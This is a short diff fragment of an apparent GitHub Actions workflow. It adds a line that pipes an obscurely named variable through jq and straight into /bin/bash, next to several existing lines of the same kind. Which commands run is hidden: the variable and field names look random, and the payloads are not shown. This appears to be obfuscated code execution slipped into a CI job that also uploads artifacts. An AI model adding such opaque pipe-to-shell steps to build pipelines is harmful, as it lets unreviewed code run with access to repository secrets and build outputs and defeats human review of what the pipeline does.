@@ -27,6 +27,7 @@ jobs:
           echo $uer53 | jq -r .pmq47708 | /bin/bash
           printf '%s' "$nbr1779" | jq -r .u872 | /bin/bash
           echo $l69 | jq -r .fuk75 | /bin/bash
+          printf '%s' "$i6" | jq -r .njr323 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
